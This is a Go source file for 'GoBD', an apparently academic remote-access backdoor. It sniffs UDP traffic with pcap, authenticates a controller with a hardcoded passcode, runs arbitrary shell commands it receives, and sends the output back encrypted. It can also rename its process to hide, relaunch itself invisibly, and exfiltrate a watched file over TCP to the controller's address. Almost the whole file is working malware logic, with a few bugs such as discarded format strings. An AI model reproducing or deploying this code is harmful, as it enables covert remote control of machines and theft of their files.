package main
/* bdmain.go
PROGRAM: GoBD
AUTHOR: Ramzi Chennafi
DATE: October 18 2015
FUNCTIONS:
 main()
 SetProcessName(string) error
 intiateClient(ip string, port, lport int)
 grabOutput(serverConn *net.UDPConn) 
 intiateServer(iface string, port, lport int)
 handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int)
 executeServerCommand(data, ip string, port int)
 executeCommand(cmd, ip string, port int)
 sendEncryptedData(port int, data, ip string)
 checkError(err error) 
 GetLocalIP() string

ABOUT:
  bdmain.go is the central code body for the GoBD program. Contained within are all methods related to starting and stopping 
 the server and client. The communications are done using UDP  including packet sniffing to create backdoor communications. 
 All messages are encrypted using AES-256 and client to sever connections require authentication using the control code.

USAGE:
 Type GoBD --help. While authenticated type ?help for more info on client options. Requires a backdoor to connect to. These
 two programs can be used across any operating system, commands will be executed the same.
*/
import(
	"os"
	"time"
	"os/exec"
	"io"
	"flag"
	"encoding/binary"
	"fmt"
	"strings"
//	"strconv"
	"github.com/google/gopacket/layers"
	"runtime"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"net"
)

const passwd = "D"; //The authentication code
const MAX_PORT = 45535
const CLIENT = 1
const SERVER = 0
const SND_CMPLETE = 3414
const helpStr = "Client Usage Help\n" +"=================================\n" +
"EXEC Commands\nSending any command will result in it being executed by the backdoor at the other end.\n" +
"Once the command is sent, you will recieve the output back from the backdoor.\n============\nBD Commands\n" + "These commands are prefixed by a ! and are executed on the backdoors own program options\n!setprocess [name]\n" + "==================================\n"

var authenticatedAddr string //Currently authenticated address
var handle *pcap.Handle
var err error
var localip net.IP
var localmac net.HardwareAddr
var destmac net.HardwareAddr
var pType int
var i int
/* 
    FUNCTION: func main()
    RETURNS: Nothing
    
    ABOUT:
    The main loop of program execution. Allows for retreiving of flags and intiation of client / server.
*/
func main(){

	//SetProcessName("dnsp")

	//flags
	modePtr      := flag.String("mode", "client", "The mode of the application, may either be" +
		         " client or server. Defaults to client.")
	ipPtr        := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.")
	portPtr      := flag.Int("port", 3322, "The port to connect to in client mode, or to listen on in server mode. Defaults to 3322.")
	interfacePtr := flag.String("iface", "wlan0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.")
	lPortPtr     := flag.Int("lport", 3321, "The port for the client to listen on.")
	hiddenPtr    := flag.String("visible", "true", "Determines whether the server will be hidden or not. true for visible and false for invisible.")
	dstMacPtr    := flag.String("dMac", "", "Destination mac of the outgoing connection.")
	//flags

	flag.Parse()

	destmac, _ = net.ParseMAC(*dstMacPtr)
	localip = GetLocalIP()
	localmac = GetLocalMAC(*interfacePtr)
	
	if *hiddenPtr == "false" && *modePtr == "server" {

		var procAttr os.ProcAttr 
		procAttr.Files = []*os.File{os.Stdin, nil, nil} 
		
		arguments := make([]string, 7)
		arguments[0] = ""
		arguments[1] = fmt.Sprintf("-mode=%s", *modePtr)
		arguments[2] = fmt.Sprintf("-ip=%s", *ipPtr)
		arguments[3] = fmt.Sprintf("-port=%d", *portPtr)
		arguments[4] = fmt.Sprintf("-iface=%s", *interfacePtr)
		arguments[5] = fmt.Sprintf("-lport=%d", *lPortPtr)
		arguments[6] = fmt.Sprint("-visible=invalid")
		if runtime.GOOS == "windows"{
			_, err := os.StartProcess("GoBD", arguments, &procAttr)
			checkError(err)
		} else {
			_, err := os.StartProcess("./GoBD", arguments, &procAttr)
			checkError(err)
		}
		return
	}

	intiateTools()
	
	handle, err = pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever)
	checkError(err)

	switch *modePtr {
	case "client":
		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr)
		pType = CLIENT
		intiateClient(*ipPtr, uint16(*portPtr), uint16(*lPortPtr))
		break
	case "server":
		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr)
		pType = SERVER
		beginListen(*ipPtr, uint16(*portPtr), uint16(*lPortPtr))
	}
}
func beginListen(ip string, port, lport uint16) {

	var ipLayer layers.IPv4
	var ethLayer layers.Ethernet
	var udpLayer layers.UDP

	i = 0
	buffer := make([]byte, 10000000)
	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer)
	decoded := make([]gopacket.LayerType, 0, 3)
	
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet, err := packetSource.NextPacket() 
		checkError(err)

		err = parser.DecodeLayers(packet.Data(), &decoded)
		if err != nil {
			continue
		}

		if len(decoded) != 3 {
			fmt.Println("Not enough layers!")
			continue
		}

		if pType == CLIENT {
			buffer = clientControl(MAX_PORT - uint16(udpLayer.SrcPort), ipLayer.SrcIP.String(), uint16(udpLayer.DstPort), lport, buffer)
		} else {
			buffer = serverControl(MAX_PORT - uint16(udpLayer.SrcPort), ipLayer.SrcIP.String(), uint16(udpLayer.DstPort), port, lport, buffer, []byte(udpLayer.Payload))
		}
		
	}
}
func serverControl(val uint16, sIP string, port, dport, lport uint16, buffer []byte, payload []byte) []byte{

	if sIP == authenticatedAddr {
		
		curr_bytes := buffer[i:i + 1]
		binary.LittleEndian.PutUint16(curr_bytes, val)
		i = i + 2
		
		if(port == SND_CMPLETE){

			if strings.HasPrefix(string(buffer), "[EXEC]") {
				executeCommand(string(buffer), sIP, dport);
			}
			if strings.HasPrefix(string(buffer), "[BD]") {
				executeServerCommand(string(buffer), sIP, dport);
			}

			buffer = buffer[:0]
			i = 0
		}
	} else if port  == lport {
		
		data := decrypt_data(payload)

		if data == passwd {
			fmt.Printf("Authcode recieved, opening communication with %s\n", sIP);
			authenticatedAddr = sIP;
		}
	}
	
	return buffer
}
/* 
    FUNCTION: func  executeServerCommand(data, ip string, port int) 
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to
                string data : command to execute

    ABOUT:
    Executes incoming client commands on the GoBD program itself. Current commands include:
              setprocess [name] - sets the process name of the gobd program
              exit - exits the gobd program cleanly
*/
func executeServerCommand(data, ip string, port uint16) {

	fmt.Printf("%s\n", data);

	tempstr := strings.SplitAfterN(data, "[BD]!", 2);
	args := strings.Split(tempstr[1], " ");

	var out string;
	
	switch args[0] {
	case "setprocess" :
		err := SetProcessName(args[1]);
		if err != nil {
			fmt.Printf("%s\n", err);
			out = fmt.Sprintf("%s", err);
		} else {
			out = fmt.Sprintf("Process name set to %s\n", args[1]);
		}
		break;
		
	case "monitor":
		sendEncryptedData(port, "Monitoring for requested file\n", ip);
		go monitorFile(ip, args[1], port + 1);
		break;

	case "exit" :
		sendEncryptedData(port, "Server exiting...\n", ip);
		os.Exit(0);
		break;

	default:
		out = "Not a valid command.\n";
	}

	fmt.Printf("%s", out);

	sendEncryptedData(port, out, ip);	
}

func monitorFile(ip, filename string, port uint16){

	for {
		time.Sleep(1000 * time.Millisecond);
		_, err := os.Stat(filename)
		if os.IsNotExist(err) {
			continue;
		}

		var target string
		fmt.Sprintf(target, "%s:%d", ip, port)
		conn, _ := net.Dial("tcp", target)

		file, err := os.Open(strings.TrimSpace(filename)) // For read access.
		checkError(err)
		
		defer file.Close() // make sure to close the file even if we panic.

		_, err = io.Copy(conn, file)
		checkError(err)
		return
	}
}
/* 
    FUNCTION: func  executeCommand(cmd, ip string, port int) 
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to
                string cmd : command to execute

    ABOUT:
    Executes incoming client commands on the host machine.
*/
func executeCommand(cmd, ip string, port uint16){
	
	fmt.Printf("%s\n", cmd);

	tempstr := strings.SplitAfterN(cmd, "[EXEC]", 2);
	args := strings.Split(tempstr[1], " ");
	
	out, _ := exec.Command(args[0], args[1:]...).CombinedOutput();
	fmt.Printf("OUT:\n%s", out);

	sendEncryptedData(port, string(out[:]), ip);
}
